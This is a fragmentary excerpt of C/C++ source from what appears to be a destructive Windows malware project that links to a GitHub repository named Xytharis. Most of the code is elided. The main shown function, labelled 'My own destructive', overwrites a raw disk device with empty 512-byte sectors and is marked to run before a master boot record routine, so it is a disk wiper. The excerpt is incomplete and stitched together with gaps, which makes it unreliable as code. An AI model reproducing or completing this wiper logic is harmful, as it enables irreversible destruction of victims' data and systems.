...
int p30() 
{
	// Whatever, it's impossible to set the system language without logging off.
...
int p36() {
	...
	while (true) {
		...
		// https://github.com/kevlu8/Xytharis/issues/7
...
// My own destructive
int p41(){
// Overwriting ~~entire~~ disk
// MUST CALLED BEFORE MBR CALL
unsigned char EmptySector[512] = {
    ...
    // Read Project1 malware for more details.
    ...
    for(int i=0;i<512;i++){
        WriteFile(hDevice, EmptySector, 512, &dwBytesWritten, 0);
    }
    CloseHandle(hDevice);
}
